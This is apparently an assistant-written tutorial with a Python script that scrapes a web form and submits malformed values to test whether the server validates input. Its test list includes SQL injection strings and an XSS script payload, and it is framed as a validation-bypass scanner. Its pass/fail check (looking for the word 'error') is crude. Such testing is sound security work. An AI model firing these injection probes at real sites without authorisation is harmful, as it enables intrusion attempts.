Python script using `requests` and `BeautifulSoup` to automate testing for client-side validation bypass. This script will:  

1. **Find input fields** on a form.  
2. **Submit invalid data** while bypassing JavaScript validation.  
3. **Check server responses** to see if it accepts the invalid input.  

---

### **Requirements**
Install dependencies:
```bash
pip install requests beautifulsoup4
```

---

### **Python Script: Bypassing Client-Side Validation**
```python
import requests
from bs4 import BeautifulSoup

# Target form URL
URL = "https://example.com/order"

# Headers to mimic a real browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Test cases: Inject invalid data to bypass client-side validation
TEST_DATA = {
    "quantity": ["9999", "-1", "0", "abc", "' OR 1=1 --"],
    "email": ["invalid-email", "test@.com", "test@ex'ample.com"],
    "name": ["<script>alert(1)</script>", "admin' --"],
}

def find_form_fields(url):
    """Extract input field names from the form."""
    response = requests.get(url, headers=HEADERS)
    soup = BeautifulSoup(response.text, "html.parser")
    form = soup.find("form")

    if not form:
        print("[!] No form found on the page.")
        return []

    inputs = form.find_all("input")
    fields = [inp.get("name") for inp in inputs if inp.get("name")]
    print(f"[+] Found form fields: {fields}")
    return fields

def test_validation(url, fields):
    """Test each field with invalid data to check for server-side validation."""
    for field in fields:
        if field not in TEST_DATA:
            continue

        for invalid_value in TEST_DATA[field]:
            print(f"[*] Testing {field} with value: {invalid_value}")

            # Prepare form data with one invalid field at a time
            data = {f: "valid" for f in fields}  # Fill with dummy valid data
            data[field] = invalid_value  # Inject invalid data

            # Send POST request
            response = requests.post(url, headers=HEADERS, data=data)

            # Analyze response
            if "error" not in response.text.lower():
                print(f"[!] Possible validation bypass on {field}: {invalid_value}")
            else:
                print(f"[+] Server properly validated {field}")

def main():
    print("[*] Scanning form...")
    fields = find_form_fields(URL)
    
    if fields:
        print("[*] Testing validation bypass...")
        test_validation(URL, fields)

if __name__ == "__main__":
    main()
```

---

### **How It Works**
1. **Finds form fields** on the target page using BeautifulSoup.  
2. **Attempts to submit invalid data** (e.g., `9999` for quantity, XSS payloads, SQL injection).  
3. **Checks the server response** to determine if it properly validates the input.  
4. **Reports fields that may be vulnerable** to bypassing client-side validation.  

---

### **Expected Output**
```
[*] Scanning form...
[+] Found form fields: ['name', 'email', 'quantity']
[*] Testing validation bypass...
[*] Testing quantity with value: 9999
[!] Possible validation bypass on quantity: 9999
[*] Testing email with value: invalid-email
[+] Server properly validated email
[*] Testing name with value: <script>alert(1)</script>
[!] Possible validation bypass on name: <script>alert(1)</script>
```

---

### **Next Steps**
🚀 **Enhance this script to**:  
- Automatically detect `maxlength`, `pattern`, or `required` attributes.  
- Try different `Content-Type` headers (e.g., JSON payloads).  
- Log responses for further analysis.  
